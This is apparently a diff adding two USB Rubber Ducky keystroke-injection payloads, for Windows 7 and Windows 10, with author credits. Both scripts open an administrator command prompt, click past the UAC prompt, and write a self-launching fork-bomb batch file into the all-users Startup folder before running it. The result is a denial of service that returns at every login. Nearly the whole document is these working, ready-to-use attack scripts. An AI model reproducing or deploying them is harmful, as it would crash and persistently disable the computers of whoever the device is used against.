@@ -1,0 +1,73 @@
+Author: Jay Kruer with mad props to Darren Kitchen for helping me out with con copy, UAC bypass & file saving issues at DerbyCon :D
+Duckencoder: 1.0
+Target: Windows 7
+Description: Opens a command prompt as an administrator with run, uses con copy to create fork bomb batch(if you don't know what this is then see: http://en.wikipedia.org/wiki/Fork_bomb). Then saves the .bat file under the start up program folder and runs it the first time.
+
+```
+CONTROL ESCAPE
+DELAY 200
+STRING cmd
+DELAY 200
+MENU
+DELAY 100
+STRING a
+ENTER
+DELAY 200
+LEFT
+ENTER
+DELAY 1000
+STRING cd %ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\
+ENTER
+STRING copy con a.bat
+ENTER
+STRING @echo off
+ENTER
+STRING :START
+ENTER
+STRING start a.bat 
+ENTER
+STRING GOTO START
+ENTER
+CONTROL z
+ENTER
+STRING a.bat
+ENTER
+ALT F4
+```
+
+
+
+Author: Trump, FULL CREDIT & RESPECT TO THE PREVIOUS AUTHORS
+Duckencoder: 1.2
+Target: Windows 10
+Description: Same as before except revamped for Windows 10 Users. PLEASE ADD DELAYS DEPENDING ON COMPUTER SPEED!!
+
+```
+GUI
+DELAY 200
+STRING CMD
+DELAY 500
+CTRL SHIFT ENTER
+DELAY 500
+LEFT
+DELAY 200
+ENTER
+DELAY 200
+STRING cd %ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\
+ENTER
+STRING copy con a.bat
+ENTER
+STRING @echo off
+ENTER
+STRING :START
+ENTER
+STRING start a.bat 
+ENTER
+STRING GOTO START
+ENTER
+CTRL c
+ENTER
+STRING a.bat
+ENTER
+ALT F4
+```
